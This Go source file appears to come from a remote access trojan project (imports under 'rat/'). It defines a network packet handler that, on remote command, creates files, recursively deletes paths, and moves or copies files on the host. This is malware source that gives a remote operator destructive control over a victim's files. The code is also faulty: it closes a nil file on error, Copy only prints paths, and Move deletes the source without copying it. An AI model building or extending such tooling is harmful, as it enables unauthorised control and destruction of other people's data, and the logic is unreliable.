package main

import (
	"fmt"
	"os"
	"path/filepath"
	"rat/shared"
	"rat/shared/network/header"
	"strings"
)

type FilePacket struct {
	Task        shared.FileTask `network:"receive"`
	File        string          `network:"receive"`
	Destination string          `network:"receive"`
}

func (packet FilePacket) Header() header.PacketHeader {
	return header.FileHeader
}

func (packet FilePacket) OnReceive() error {
	file := packet.File
	task := shared.FileTask(packet.Task)

	switch task {
	case shared.Touch:
		f, ferr := os.Create(file)
		if ferr != nil {
			f.Close()
		}
	case shared.Unlink:
		os.RemoveAll(file)
	case shared.Move:
		defer os.RemoveAll(file)
		fallthrough
	case shared.Copy:
		dest := packet.Destination
		stat, _ := os.Stat(file)

		if stat.IsDir() {
			filepath.Walk(file, func(filepath string, fileInfo os.FileInfo, err error) error {
				newpath := strings.Replace(filepath, file, dest, -1)
				fmt.Println("Old:", filepath, "new:", newpath)
				return nil
			})
		} else {
			fmt.Println(filepath.Join(dest, filepath.Base(file)))
		}
	}

	return nil
}
